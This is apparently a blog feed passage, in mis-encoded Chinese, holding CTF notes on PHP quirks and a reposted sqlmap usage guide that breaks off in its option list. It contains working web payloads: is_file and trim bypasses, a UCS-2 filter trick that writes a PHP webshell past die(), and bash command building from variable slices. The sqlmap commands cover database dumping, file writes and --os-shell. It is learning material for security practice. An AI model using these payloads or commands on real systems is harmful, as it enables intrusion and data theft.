¹æ®æ­£åˆ™æ”¹ï¼Œåé¢æ˜¯æ‰§è¡Œè¯­å¥ï¼Œå¦‚æœæœ‰strrev() è¿™ç§å­—ç¬¦ä¸²åè½¬å‡½æ•°é…åˆç”¨æ›´å¥½ã€‚</p><h1 id="15ã€è¿­ä»£å™¨è·å–å½“å‰ç›®å½•"><a href="#15ã€è¿­ä»£å™¨è·å–å½“å‰ç›®å½•" class="headerlink" title="15ã€è¿­ä»£å™¨è·å–å½“å‰ç›®å½•"></a>15ã€è¿­ä»£å™¨è·å–å½“å‰ç›®å½•</h1><p>FilesystemIteratorå¯ä»¥è·å¾—æ–‡ä»¶ç›®å½•ï¼Œå‚æ•°éœ€è¦ . æˆ–è€…å…·ä½“è·¯å¾„ï¼Œgetcwd()è¿™ä¸ªå‡½æ•°å¯ä»¥è·å–å½“å‰æ–‡ä»¶è·¯å¾„ï¼ŒäºŒè€…åœ¨ä¸€å®šæ¡ä»¶ä¸‹é…åˆä½¿ç”¨è¾ƒå¥½</p><h1 id="16ã€-GLOBALSå…¨å±€å˜é‡çš„ä½¿ç”¨"><a href="#16ã€-GLOBALSå…¨å±€å˜é‡çš„ä½¿ç”¨" class="headerlink" title="16ã€$GLOBALSå…¨å±€å˜é‡çš„ä½¿ç”¨"></a>16ã€$GLOBALSå…¨å±€å˜é‡çš„ä½¿ç”¨</h1><p>$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡<br>ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</p><p>æ„é€ å‡ºvar_dump($GLOBALS);å¯ä»¥è¾“å‡ºå…¨éƒ¨å˜é‡å€¼ï¼ŒåŒ…æ‹¬è‡ªå®šä¹‰</p><h1 id="17ã€phpä¼ªåè®®ç»•è¿‡is-file-highlight-fileå¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨"><a href="#17ã€phpä¼ªåè®®ç»•è¿‡is-file-highlight-fileå¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨" class="headerlink" title="17ã€phpä¼ªåè®®ç»•è¿‡is_file highlight_fileå¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨"></a>17ã€phpä¼ªåè®®ç»•è¿‡is_file highlight_fileå¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨</h1><p>is_fileåˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ï¼Œè¿”å›å€¼ä¸ºå¸ƒå°”ç±»å‹ã€‚is_fileä¼šè®¤ä¸ºphpä¼ªåè®®ä¸æ˜¯æ–‡ä»¶ã€‚ä½†highlight_fileè®¤ä¸ºä¼ªåè®®å¯ä»¥æ˜¯æ–‡ä»¶ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¦‚ä¸Šçš„ä»£ç ï¼Œå¯ä»¥ä¼ å…¥phpä¼ªåè®®è¿›è¡Œç»•è¿‡å¹¶ä¸”æ˜¾ç¤ºå«æœ‰flagçš„æ–‡ä»¶ã€‚è‹¥æœ‰è¿‡æ»¤ï¼Œå¯ä»¥æ¢å…¶ä»–ä¼ªåè®®æˆ–æ”¹ç¼–ç æ–¹å¼</p><h1 id="18ã€å¤šå†™æ ¹ç›®å½•ç»•è¿‡is-file"><a href="#18ã€å¤šå†™æ ¹ç›®å½•ç»•è¿‡is-file" class="headerlink" title="18ã€å¤šå†™æ ¹ç›®å½•ç»•è¿‡is_file"></a>18ã€å¤šå†™æ ¹ç›®å½•ç»•è¿‡is_file</h1><p>åœ¨linuxä¸­&#x2F;proc&#x2F;self&#x2F;rootæ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ls &#x2F;proc&#x2F;self&#x2F;rootï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹<br>å¤šæ¬¡é‡å¤åç»•è¿‡is_fileçš„å…·ä½“åŸç†å°šä¸æ¸…æ¥šã€‚å¦‚ä¸Šé¢çš„ä»£ç ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸‹é¢payloadä»£æ›¿</p><p>file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>è¿™ä¸ªæŒ‰ç†è¯´ä¹Ÿæ˜¯æ–‡ä»¶çš„ï¼Œä½†is_fileè®¤ä¸ºä¸æ˜¯</p><h1 id="19ã€trimå‡½æ•°çš„ç»•è¿‡-is-numericç»•è¿‡"><a href="#19ã€trimå‡½æ•°çš„ç»•è¿‡-is-numericç»•è¿‡" class="headerlink" title="19ã€trimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡"></a>19ã€trimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡</h1><p>è¿™ä¸¤ä¸ªå‡½æ•°ä¸€èµ·æ£€æµ‹æ—¶ï¼Œis_numericè®¤ä¸ºå†…å®¹é‡Œæœ‰%09 %0a %0b %0c %0d %20ä¹Ÿç®—æ•°å­—ï¼Œè·Ÿtrimä¸€èµ·æµ‹è¯•ä¸€ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for ($i=0; $i &lt;=128 ; $i++) &#123; </span><br><span class="line">    $x=chr($i).&#x27;1&#x27;;</span><br><span class="line">   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;</span><br><span class="line">        echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>é™¤äº†+-.å·ä»¥å¤–è¿˜æœ‰åªå‰©ä¸‹%0cä¹Ÿå°±æ˜¯æ¢é¡µç¬¦äº†ï¼Œtrimé»˜è®¤æ—¶æ²¡æœ‰å‰”é™¤%0cã€‚å½¢å¦‚ä»¥ä¸‹ä»£ç å¯ä»¥ç»•è¿‡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>payload:num&#x3D;%0c36</p><h1 id="20ã€ç»•è¿‡æ­»äº¡die"><a href="#20ã€ç»•è¿‡æ­»äº¡die" class="headerlink" title="20ã€ç»•è¿‡æ­»äº¡die"></a>20ã€ç»•è¿‡æ­»äº¡die</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</span><br></pre></td></tr></table></figure></div><p>è¿™é“çœ‹äº†ç¾½å¸ˆå‚…wpï¼Œè¿‡æ»¤äº†è®¸å¤šåè®®ï¼Œè¿™æ˜¯å–ä¸€ä¸ª UCS-2LE UCS-2BE</p><p>payload:<br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php<br>post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?<br>è¿™ä¼šå°†å­—ç¬¦ä¸¤ä½ä¸¤ä½äº¤æ¢ï¼Œfile_put_contentsåœ¨å†™å…¥çš„æ—¶å€™ä¼šç ´åé‚£å¥dieï¼Œä½†contentsé‚£å¥æ¢å¤åŸè²Œï¼Œå¯ä»¥æ‰§è¡Œ</p><h1 id="21ã€é€šè¿‡å†…ç½®bashå‘½ä»¤æ„é€ å‘½ä»¤"><a href="#21ã€é€šè¿‡å†…ç½®bashå‘½ä»¤æ„é€ å‘½ä»¤" class="headerlink" title="21ã€é€šè¿‡å†…ç½®bashå‘½ä»¤æ„é€ å‘½ä»¤"></a>21ã€é€šè¿‡å†…ç½®bashå‘½ä»¤æ„é€ å‘½ä»¤</h1><p>åœ¨è®¸å¤šå‘½ä»¤è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä¸€ä¸ªå­—æ¯ä¸€ä¸ªå­—æ¯å¾—æ„é€ ï¼Œè€Œè¿™äº›å­—æ¯ä»å†…ç½®å˜é‡é‡Œé¢æˆªï¼Œæ¯”å¦‚æ„é€ nlï¼Œå¯ä»¥å†™ä¸ºä¸‹é¢è¿™ç§æ–¹å¼</p><p>${PATH:14:1}${PATH:5:1}</p><p>åœ¨linuxä¸­å¯ä»¥ç”¨~è·å–å˜é‡çš„æœ€åå‡ ä½ï¼Œä¹Ÿå¯ä»¥å†™ä¸º${PATH:~0}${PWD:~0}ï¼Œå­—æ¯ä¸0ä½œç”¨ä¸€æ ·ï¼Œ${PATH:~A}${PWD:~A}ä¹Ÿæ˜¯nlï¼Œflag.phpä¹Ÿè¿‡æ»¤äº†çš„è¯å¯ä»¥ç”¨????.???ï¼Œå…·ä½“æƒ…å†µï¼Œå…·ä½“å¯¹å¾…</p><h1 id="22ã€PHPå˜é‡åéæ³•å­—ç¬¦"><a href="#22ã€PHPå˜é‡åéæ³•å­—ç¬¦" class="headerlink" title="22ã€PHPå˜é‡åéæ³•å­—ç¬¦"></a>22ã€PHPå˜é‡åéæ³•å­—ç¬¦</h1><p>æ¯”å¦‚ä¼ å…¥AA_BB.CCè¿™ä¸ªå˜é‡ï¼ŒPHPæ˜¯ä¸å…è®¸å˜é‡åä¸­å«æœ‰. çš„ï¼Œä¼šé»˜è®¤å°†ä¸åˆæ³•å­—ç¬¦æ›¿æ¢ä¸º_,å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">var_dump($_POST);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure></div><p>ä¼ å€¼ï¼šAA.BB.CC&#x3D;14<br>è¾“å‡ºï¼šarray(1) { [â€œAA_BB_CCâ€]&#x3D;&gt; string(2) â€œ14â€ }<br>ä½†è¾“å…¥AA[BB.CCå®ƒå°±åªæ›¿æ¢ [ è¾“å‡º array(1) { [â€œAA_BB.CCâ€]&#x3D;&gt; string(2) â€œ14â€ }</p><h1 id="23ã€gettextæ‹“å±•çš„ä½¿ç”¨"><a href="#23ã€gettextæ‹“å±•çš„ä½¿ç”¨" class="headerlink" title="23ã€gettextæ‹“å±•çš„ä½¿ç”¨"></a>23ã€gettextæ‹“å±•çš„ä½¿ç”¨</h1><p>var_dump(call_user_func($f1,$f2));<br>å¦‚ä»¥ä¸Šä»£ç ï¼Œå¤šé‡è¿‡æ»¤åï¼Œf1å¯ä»¥ä¸ºgettextï¼Œf2å¯ä»¥ä¸ºphpinfoï¼Œå¦‚æœè¿‡æ»¤æ›´ä¸ºä¸¥æ ¼ï¼Œæ›´æ”¹iniæ–‡ä»¶é‡Œçš„æ‹“å±•åï¼Œ _() ç­‰æ•ˆäº gettext()</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo gettext(&quot;phpinfo&quot;);</span><br><span class="line">ç»“æœ  phpinfo</span><br><span class="line"></span><br><span class="line">echo _(&quot;phpinfo&quot;);</span><br><span class="line">ç»“æœ phpinfo</span><br></pre></td></tr></table></figure></div><h1 id="24ã€æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡"><a href="#24ã€æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡" class="headerlink" title="24ã€æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡"></a>24ã€æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡</h1><p>PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limit<br>å›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´å‰é¢100ä¸‡ä¸ªå­—æ¯ï¼Œåé¢æ˜¯è¯­å¥å°±å¥½ï¼Œå¦‚ä¸‹é¢çš„ä¾‹å­</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/.+?ABC/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f, &#x27;ABC&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $flag;</span><br></pre></td></tr></table></figure></div><p>å‰é¢100ä¸‡ä¸ªå­—æ¯åé¢ABCå°±å¯ä»¥echo $flag</p><h1 id="25ã€è°ƒç”¨ç±»ä¸­çš„å‡½æ•°"><a href="#25ã€è°ƒç”¨ç±»ä¸­çš„å‡½æ•°" class="headerlink" title="25ã€è°ƒç”¨ç±»ä¸­çš„å‡½æ•°"></a>25ã€è°ƒç”¨ç±»ä¸­çš„å‡½æ•°</h1><p>-&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹<br>::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•</p><p>ä¹Ÿå°±æ˜¯è¯´åŒå†’å·ä¸ç”¨å®ä¾‹åŒ–ç±»å°±å¯ä»¥è°ƒç”¨ç±»ä¸­çš„é™æ€æ–¹æ³•</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure></div><p>è¿™ä¸ªä¼ å…¥ctfshow&#x3D;ctfshow::getFlagå³å¯</p><h1 id="26ã€returnç»•è¿‡"><a href="#26ã€returnç»•è¿‡" class="headerlink" title="26ã€returnç»•è¿‡"></a>26ã€returnç»•è¿‡</h1><p>eval(â€œreturn 1;phpinfo();â€);ä¼šå‘ç°æ˜¯æ— æ³•æ‰§è¡Œphpinfo()çš„ï¼Œä½†æ˜¯phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ 1-phpinfo();æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚</p><p>æ¥æº: Tajangçš„å¤§åƒä¸–ç•Œ<br>æ–‡ç« ä½œè€…: Tajang<br>æ–‡ç« é“¾æ¥: <a class="link"   href="https://ctfking.com/2021/07/14/php-te-xing-zong-jie/" >https://ctfking.com/2021/07/14/php-te-xing-zong-jie/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="phpç‰¹æ€§" scheme="http://example.com/categories/php%E7%89%B9%E6%80%A7/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap</title>
    <link href="http://example.com/2025/03/04/web/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2025/03/04/web/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2025-03-04T12:50:02.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>è½¬è½½è‡ª<a class="link"   href="https://www.cnblogs.com/R3col/p/12452543.html" >https://www.cnblogs.com/R3col/p/12452543.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="sqlmapç®€ä»‹"><a href="#sqlmapç®€ä»‹" class="headerlink" title="sqlmapç®€ä»‹"></a>sqlmapç®€ä»‹</h2><p>sqlmapæ”¯æŒäº”ç§ä¸åŒçš„æ³¨å…¥æ¨¡å¼ï¼š<br>åŸºäºå¸ƒå°”çš„ç›²æ³¨<br>åŸºäºæ—¶é—´çš„ç›²æ³¨<br>åŸºäºæŠ¥é”™æ³¨å…¥<br>è”åˆæŸ¥è¯¢æ³¨å…¥<br>å †å æ³¨å…¥<br>sqlmapæ”¯æŒä¹ç§ä¸åŒçš„æ•°æ®åº“ï¼š<br>â€‹ MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybaseå’ŒSAP MaxDB</p><h2 id="å¸¸ç”¨è¯­å¥"><a href="#å¸¸ç”¨è¯­å¥" class="headerlink" title="å¸¸ç”¨è¯­å¥"></a>å¸¸ç”¨è¯­å¥</h2><p>è‡ªåŠ¨æ£€æµ‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -batch</span><br></pre></td></tr></table></figure></div><p>æŒ‡å®šå‚æ•°</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx/?id=x&amp;param=x -p id</span><br></pre></td></tr></table></figure></div><p>æŒ‡å®šæ•°æ®åº“ç±»å‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx â€“dbms mysql</span><br></pre></td></tr></table></figure></div><p>ä»æ–‡ä»¶è¯»å–httpè¯·æ±‚æŠ¥æ–‡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -batch</span><br></pre></td></tr></table></figure></div><p>è®¾ç½®cookie</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --cookie=&quot;JSESSION=asd&quot;</span><br></pre></td></tr></table></figure></div><p>æŸ¥è¯¢æ•°æ®åº“</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --dbs</span><br></pre></td></tr></table></figure></div><p>æŸ¥è¯¢è¡¨</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D æ•°æ®åº“å --tables</span><br></pre></td></tr></table></figure></div><p>æŸ¥å­—æ®µå</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D æ•°æ®åº“å -T è¡¨å --columns</span><br></pre></td></tr></table></figure></div><p>çˆ†æ•°æ®</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D æ•°æ®åº“å -T è¡¨å -C &quot;å­—æ®µå1ï¼Œå­—æ®µå2&quot;--dump</span><br></pre></td></tr></table></figure></div><p>åœ¨æ•°æ®åº“ä¸­æœç´¢å­—æ®µ &#x2F; è¡¨ &#x2F; æ•°æ®åº“å</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --search -C/T/D admin,password</span><br></pre></td></tr></table></figure></div><p>å†™å…¥æ–‡ä»¶</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.xxx -â€“file-dest &quot;è¦å†™å…¥çš„æ–‡ä»¶åœ¨æœ¬åœ°çš„è·¯å¾„&quot; â€“file-write &quot;ç›®æ ‡è·¯å¾„&quot;</span><br></pre></td></tr></table></figure></div><p>è°ƒç”¨shell</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.xxx --os-shell</span><br></pre></td></tr></table></figure></div><p>-tip: æ˜¯å¦è·Ÿéš302è·³è½¬<br>â€‹ å½“æ³¨å…¥é¡µé¢é”™è¯¯çš„æ—¶å€™ï¼Œè‡ªåŠ¨è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢çš„æ—¶å€™éœ€è¦è·Ÿéš302ï¼Œ<br>â€‹ å½“æ³¨å…¥é”™è¯¯çš„æ—¶å€™ï¼Œå…ˆæŠ¥é”™å†è·³è½¬çš„æ—¶å€™ï¼Œä¸éœ€è¦è·Ÿéš302ã€‚<br>â€‹ ç›®çš„æ˜¯è¦è¿½è¸ªåˆ°é”™è¯¯ä¿¡æ¯ã€‚</p><h2 id="sqlmapè¯¦ç»†å‘½ä»¤"><a href="#sqlmapè¯¦ç»†å‘½ä»¤" class="headerlink" title="sqlmapè¯¦ç»†å‘½ä»¤"></a>sqlmapè¯¦ç»†å‘½ä»¤</h2><p>ç”¨æ³•<br>python sqlmap.py [é€‰é¡¹]</p><p>é€‰é¡¹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help            æ˜¾ç¤ºåŸºæœ¬å¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</span><br><span class="line">-hh                   æ˜¾ç¤ºé«˜çº§å¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</span><br><span class="line">--version             æ˜¾ç¤ºç¨‹åºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡º</span><br><span class="line">-v VERBOSE            è¾“å‡ºä¿¡æ¯è¯¦ç»†ç¨‹åº¦çº§åˆ«ï¼š0-6ï¼ˆé»˜è®¤ä¸º 1ï¼‰</span><br></pre></td></tr></table></figure></div><p>ç›®æ ‡<br>â€‹ è‡³å°‘æä¾›ä¸€ä¸ªä»¥ä¸‹é€‰é¡¹ä»¥æŒ‡å®šç›®æ ‡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d DIRECT           ç›´æ¥è¿æ¥æ•°æ®åº“</span><br><span class="line">-u URL, --url=URL   ç›®æ ‡ URLï¼ˆä¾‹å¦‚ï¼š&quot;http://www.site.com/vuln.php?id=1&quot;ï¼‰</span><br><span class="line">-l LOGFILE          ä» Burp æˆ– WebScarab ä»£ç†çš„æ—¥å¿—æ–‡ä»¶ä¸­è§£æç›®æ ‡åœ°å€</span><br><span class="line">-m BULKFILE         ä»æ–‡æœ¬æ–‡ä»¶ä¸­è·å–æ‰¹é‡ç›®æ ‡</span><br><span class="line">-r REQUESTFILE      ä»æ–‡ä»¶ä¸­è¯»å– HTTP è¯·æ±‚</span><br><span class="line">-g GOOGLEDORK       ä½¿ç”¨ Google dork ç»“æœä½œä¸ºç›®æ ‡</span><br><span class="line">-c CONFIGFILE       ä» INI é…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹</span><br></pre></td></tr></table></figure></div><p>è¯·æ±‚<br>â€‹ ä»¥ä¸‹é€‰é¡¹å¯ä»¥æŒ‡å®šè¿æ¥ç›®æ ‡åœ°å€çš„æ–¹å¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--method=METHOD     å¼ºåˆ¶ä½¿ç”¨æä¾›çš„ HTTP æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼šPUTï¼‰</span><br><span class="line">--data=DATA         ä½¿ç”¨ POST å‘é€æ•°æ®ä¸²ï¼ˆä¾‹å¦‚ï¼š&quot;id=1&quot;ï¼‰</span><br><span class="line">--param-del=PARA..  è®¾ç½®å‚æ•°å€¼åˆ†éš”ç¬¦ï¼ˆä¾‹å¦‚ï¼š&amp;ï¼‰</span><br><span class="line">--cookie=COOKIE     æŒ‡å®š HTTP Cookieï¼ˆä¾‹å¦‚ï¼š&quot;PHPSESSID=a8d127e..&quot;ï¼‰</span><br><span class="line">--cookie-del=COO..  è®¾ç½® cookie åˆ†éš”ç¬¦ï¼ˆä¾‹å¦‚ï¼š;ï¼‰</span><br><span class="line">--load-cookies=L..  æŒ‡å®šä»¥ Netscape/wget æ ¼å¼å­˜æ”¾ cookies çš„æ–‡ä»¶</span><br><span class="line">--drop-set-cookie   å¿½ç•¥ HTTP å“åº”ä¸­çš„ Set-Cookie å‚æ•°</span><br><span class="line">--user-agent=AGENT  æŒ‡å®š HTTP User-Agent</span><br><span class="line">--random-agent      ä½¿ç”¨éšæœºçš„ HTTP User-Agent</span><br><span class="line">--host=HOST         æŒ‡å®š HTTP Host</span><br><span class="line">--referer=REFERER   æŒ‡å®š HTTP Referer</span><br><span class="line">-H HEADER, --hea..  è®¾ç½®é¢å¤–çš„ HTTP å¤´å‚æ•°ï¼ˆä¾‹å¦‚ï¼š&quot;X-Forwarded-For: 127.0.0.1&quot;ï¼‰</span><br><span class="line">--headers=HEADERS   è®¾ç½®é¢å¤–çš„ HTTP å¤´å‚æ•°ï¼ˆä¾‹å¦‚ï¼š&quot;Accept-Language: fr\nETag: 123&quot;ï¼‰</span><br><span class="line">--auth-type=AUTH..  HTTP è®¤è¯æ–¹å¼ï¼ˆBasicï¼ŒDigestï¼ŒNTLM æˆ– PKIï¼‰</span><br><span class="line">--auth-cred=AUTH..  HTTP è®¤è¯å‡­è¯ï¼ˆusername:passwordï¼‰</span><br><span class="line">--auth-file=AUTH..  HTTP è®¤è¯ PEM è¯ä¹¦/ç§é’¥æ–‡ä»¶</span><br><span class="line">--ignore-code=IG..  å¿½ç•¥ï¼ˆæœ‰é—®é¢˜çš„ï¼‰HTTP é”™è¯¯ç ï¼ˆä¾‹å¦‚ï¼š401ï¼‰</span><br><span class="line">--ignore-proxy      å¿½ç•¥ç³»ç»Ÿé»˜è®¤ä»£ç†è®¾ç½®</span><br><span class="line">--ignore-redirects  å¿½ç•¥é‡å®šå‘å°è¯•</span><br><span class="line">--ignore-timeouts   